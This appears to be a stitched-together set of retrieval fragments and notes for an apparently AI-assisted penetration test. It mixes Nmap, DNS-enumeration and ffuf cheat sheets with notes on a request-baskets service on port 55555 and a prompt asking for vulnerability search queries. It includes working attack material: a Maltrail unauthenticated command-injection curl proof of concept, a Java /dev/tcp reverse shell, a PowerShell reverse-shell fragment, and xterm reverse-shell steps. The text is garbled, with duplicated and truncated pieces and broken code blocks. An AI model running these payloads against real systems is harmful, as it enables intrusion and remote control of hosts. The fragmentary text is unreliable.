Nmap is a free and open source utility for network discovery and security auditing.

1. **Aggressive Scan (OS detection, version detection, script scanning, and traceroute)**:
   - This scan is comprehensive, combining various techniques including OS detection, version detection, script scanning, and traceroute to provide detailed information about the target.
   ```
   nmap -A <target-ip>
   ```

2. **OS Detection**:
   - This scan focuses solely on detecting the operating system running on the target machine, providing insights into the OS type and version.
   ```
   nmap -O <target-ip>
   ```

3. **Skip Host Discovery**:
   - This scan treats all hosts as online, skipping the initial host discovery phase and directly proceeding to port scanning.
   ```
   nmap -Pn <target-ip>
   ```

4. **TCP SYN Scan**:
   - Also known as a "stealth scan", this scan sends TCP SYN packets to the target's ports and analyzes the response to determine which ports are open, closed, or filtered.
   ```
   nmap -sS <target-ip>
   ```

5. **TCP Connect Scan**:
   - This scan performs a full TCP connection to each port, attempting to establish a connection and determine whether the port is open, closed, or filtered.
   ```
   nmap -sT <target-ip>
   ```

6. **UDP Scan**:
   - UDP scan is used to discover open UDP ports on the target machine, which are often overlooked but can be crucial for certain services.
   ```
   nmap -sU <target-ip>

### Nslookup

Resolve a given hostname to the corresponding IP.

```shell
nslookup targetorganization.com
```

### Reverse DNS lookup

```shell
nslookup -type=PTR IP_address
```

### MX(Mail Exchange) lookup

```shell
nslookup -type=MX domain
```

### Zone Transfer

#### Using nslookup Command

```shell
nslookup
server domain.com
ls -d domain.com
```

#### Using HOST Command

host -t ns(Name Server) < domain >

```shell
host -t ns domain.com
```

after that test nameservers

host -l < domain > < nameserver >

```shell
host -l domain.com ns2.domain.com
```

### Nmap Dns Enumaration

```
nmap -F --dns-server <dns server ip> <target ip range>
```

```

```
dnsenum --target_domain_subs.txt -v -f dns.txt -u a -r targetdomain.com
```

#### DNSmap

```bash
targetdomain.com
```

```bash

* Accessing port 55555 using a web browser reveals a request baskets service.

Interesting finding:

1. The service on port 55555 appears to be a request baskets service.

Further investigation is required to determine the security posture of the request baskets service and to identify any potential vulnerabilities. | rag-data: isplay a list of baskets that may be accessed if the basket token is known. It is possible to create a new basket if the name is not in use.

If basket was successfully created the authorization token is displayed. It is important to remember the token because it authorizes the access to management features of created basket and allows to retrieve collected HTTP requests. The token is temporary stored in browser session to simplify UI integration and improve user experience. However, once browser tab is closed, the token will be lost.

To collect HTTP requests send them (GET, POST, PUT, DELETE, etc.) to http://localhost:55555/<basket_name>

To view collected requests and manage basket: Open basket web UI http://localhost:55555/web/<basket_name> Use RESTful API exposed at http://localhost:55555/api/baskets/<basket_name>/...

It is possible to forward all incoming HTTP requests to arbitrary URL by configuring basket via web UI or RESTful API.

## Database
Request baskets keeps configured baskets and collected HTTP requests in memory. This data is lost after service or server restart.

Craft me some suggested search queries for request-baskets version 1.2.1 that might find a known vulnerability | rag-data: # request baskets
Request Baskets is a web service to collect arbitrary HTTP requests and inspect them via RESTful API or simple web UI.

It is strongly inspired by ideas and application design of the RequestHub project and reproduces functionality offered by RequestBin service.


## Features
*   RESTful API to manage and configure baskets, see Request Baskets API documentation in interactive mode
*   All baskets are protected by unique tokens from unauthorized access; end-points to collect requests do not require authorization though
* Individually configurable capacity for every basket
* Pagination support to retrieve collections: basket names, collected requests
* Configurable responses for every HTTP method
* Alternative storage types for configured baskets and collected requests:
    * In-memory - ultra fast, but limited to available RAM and collected data is lost after service restart
    * Bolt DB - fast persistent storage for collected data based on embedded bbolt database (maintained fork of Bolt), service can be restarted without data loss and storage is not limited by available RAM
    * SQL database - classical data storage, multiple instances of service can run simultaneously and collect data in shared data storage, which makes the solution more robust and scaleable (PostgreSQL and MySQL are only supported at the moment)
    * Can be extended by custom implementations of storage interface

FFUF (Fuzz Faster U Fool) is a fast web fuzzer written in Go, designed to help in quickly discovering potential vulnerabilities in web applications by performing brute force attacks on various parts of a web application.

Examples:

1. Basic usage:
ffuf -w wordlist.txt -u http://example.com/FUZZ

2. Add custom header:
ffuf -w wordlist.txt -u http://example.com/FUZZ -H "Authorization: Bearer <token>"

3. Use POST method:
ffuf -w wordlist.txt -u http://example.com/api -X POST -d "param1=value1&param2=value2"

4. Finding subdomain:
ffuf -u https://FUZZ.example.com -w wordlist.txt -mc 200,301,302,403

5. Follow redirects:
ffuf -w wordlist.txt -u http://example.com/FUZZ -r

6. Use a proxy:
ffuf -w wordlist.txt -u http://example.com/FUZZ -p http://127.0.0.1:8080

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1

```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
```

The reverse shell payload did not work. However, we have discovered that the exploit forwards to a maltrail service.
A google search revealed that the maltrail service is vulnerable to unauthenticated OS Command injectionThe proof of concept is:
curl 'http://hostname:8338/login' \
  --data 'username=;`id > /tmp/bbq`' | rag-data: ndbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
}
```

```powershell
powershell -ExecutionPolicy bypass -command "Import-Module reverse.ps1; reverse_powershell"
```

### Java Reverse Shell

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

### Xterm Reverse Shell

One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001.

```bash
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system):

```bash
Xnest :1

```

You’ll need to authorise the target to connect to you (command also run on your host):

```bash
xhost +targetip
